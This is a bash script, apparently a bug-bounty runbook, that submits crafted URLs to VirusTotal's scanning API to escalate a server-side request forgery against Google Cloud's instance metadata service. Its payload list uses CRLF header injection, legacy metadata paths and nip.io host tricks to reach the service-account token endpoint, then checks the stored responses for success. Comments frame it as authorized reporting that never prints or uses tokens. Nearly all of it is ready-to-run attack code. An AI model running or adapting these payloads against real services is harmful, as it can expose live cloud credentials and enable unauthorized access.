#!/usr/bin/env bash
# =============================================================================
# Google VRP — VirusTotal SSRF escalation: can we make IMDS return 200 + DATA?
# Portable: Termux / Linux / Pi.
#
# The submitted report (issue 523823039) is capped at LOW because every sensitive
# GCP IMDS path returned 403 (VT's scanner doesn't send Metadata-Flavor: Google).
# The ONLY thing that raises this to HIGH is making a SENSITIVE path return 200
# with real data. The single viable vector is header/CRLF injection through the
# submitted URL so VT's fetch carries Metadata-Flavor: Google. Plus a recheck of
# the legacy headerless path (/computeMetadata/v1beta1/).
#
# This submits ~12 crafted URLs to VT, waits, reads VT's STORED response, and
# flags any sensitive path that flips 403 -> 200. BOUNDED: ~12 payloads, paced for
# the free-tier limit (4/min). NOT a fuzz — these are hand-picked escalation tests.
#
# SAFETY: if a sensitive path returns 200, that body may be a LIVE GCP service-
# account TOKEN now sitting in VT's PUBLIC corpus. The script prints only the
# status/Server/SHA256/length — NEVER the body. Do NOT use any token; it becomes
# a CRITICAL report-upgrade (SSRF -> credential exposure). Report, never use.
#
# Run: VT_KEY=<your free key> OUTDIR=$HOME/vtssrf \
#   bash runbooks/PI-RUNBOOK-vt-ssrf-escalate.sh 2>&1 | tee $HOME/vtssrf/run.log
# =============================================================================
set -o pipefail
OUTDIR="${OUTDIR:-$HOME/vtssrf}"; export OUTDIR; mkdir -p "$OUTDIR"
: "${VT_KEY:?set VT_KEY=<your free VirusTotal Community api key>}"
UA='vt-research/1.0 (authorized VRP testing, issue 523823039)'
B="https://www.virustotal.com/api/v3"
PACE="${PACE:-16}"   # free tier 4/min -> 16s keeps us safe
echo "============================================================"
echo "VT SSRF ESCALATION  $(date -u '+%Y-%m-%dT%H:%M:%SZ')  IP: $(curl -s ifconfig.me)"
echo "Goal: flip a SENSITIVE IMDS path 403->200 (Metadata-Flavor injection)."
echo "Body never printed. A 200 on a token path = CRITICAL upgrade, report only."
echo "============================================================"; echo ""

# token endpoint = the prize; %0d%0a = CRLF; try injection in several positions
TOK='computeMetadata/v1/instance/service-accounts/default/token'
PAYLOADS=(
  "http://169.254.169.254/$TOK%0d%0aMetadata-Flavor:%20Google"
  "http://169.254.169.254/$TOK%0aMetadata-Flavor:Google"
  "http://169.254.169.254/$TOK%23%0d%0aMetadata-Flavor:Google"
  "http://169.254.169.254/%0d%0aMetadata-Flavor:Google%0d%0a/$TOK"
  "http://169.254.169.254/$TOK?metadata-flavor=Google"
  "http://169-254-169-254.nip.io/$TOK%0d%0aMetadata-Flavor:%20Google"
  "http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"
  "http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/?recursive=true"
  "http://169.254.169.254/0.1/meta-data/service-accounts/default/acquire"
  "http://169-254-169-254.nip.io/computeMetadata/v1beta1/instance/service-accounts/default/token"
  "http://169.254.169.254/$TOK"
  "http://metadata.google.internal/$TOK%0d%0aX:1"
)

b64url(){ printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '=\n'; }
: > "$OUTDIR/HITS.txt"
i=0
for U in "${PAYLOADS[@]}"; do
  i=$((i+1))
  echo "── [$i] submit: $U"
  code=$(curl -s -o "$OUTDIR/sub$i.json" -w '%{http_code}' --max-time 25 \
    -H "x-apikey: $VT_KEY" -H "User-Agent: $UA" \
    --data-urlencode "url=$U" "$B/urls" 2>/dev/null)
  if [ "$code" != "200" ]; then
    echo "    submit -> HTTP $code ($(head -c 120 "$OUTDIR/sub$i.json" | tr -d '\n'))"
    sleep "$PACE"; continue
  fi
  sleep "$PACE"   # let the scan run
  ID=$(b64url "$U")
  rc=$(curl -s -o "$OUTDIR/url$i.json" -w '%{http_code}' --max-time 25 \
    -H "x-apikey: $VT_KEY" -H "User-Agent: $UA" "$B/urls/$ID" 2>/dev/null)
  python3 - "$OUTDIR/url$i.json" "$U" <<'PY'
import sys,json
try: a=json.load(open(sys.argv[1]))['data']['attributes']
except Exception as e: print("    read-back: not ready / err", str(e)[:80]); sys.exit()
sc=a.get('last_http_response_code'); srv=(a.get('last_http_response_headers') or {}).get('Server')
sha=a.get('last_http_response_content_sha256'); ln=a.get('last_http_response_content_length')
print(f"    STORED: http={sc}  Server={srv!r}  len={ln}  sha={str(sha)[:16]}")
sens = 'service-accounts' in sys.argv[2] or 'meta-data' in sys.argv[2]
if sc==200 and sens:
    print("    *** ESCALATION: sensitive IMDS path returned 200 — possible LIVE")
    print("    *** metadata/token in VT public corpus. DO NOT use. CRITICAL upgrade.")
    open(__import__('os').environ['OUTDIR']+"/HITS.txt","a").write(sys.argv[2]+"\n")
PY
  sleep "$PACE"
done
echo ""
echo "════════════════════════════════════════════"
if [ -s "$OUTDIR/HITS.txt" ]; then
  echo "  *** ESCALATION CONFIRMED on:"; sed 's/^/    /' "$OUTDIR/HITS.txt"
  echo "  -> This upgrades issue 523823039 from LOW to HIGH (SSRF -> live GCP creds"
  echo "  in VT public corpus). Add a comment to the issue with the exact submitted"
  echo "  URL + the VT url-object id proving status 200 on the token path. NEVER use"
  echo "  the token. Note it is publicly retrievable -> argues for urgent remediation."
else
  echo "  No escalation: all sensitive paths still 403/blocked. The LOW ceiling is"
  echo "  REAL — header injection is sanitized and v1beta1 is decommissioned. Let the"
  echo "  report ride as-is (modest/maybe), and return to the Looker Studio hunt."
fi
echo "Evidence: $OUTDIR  (bodies never stored; only metadata)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
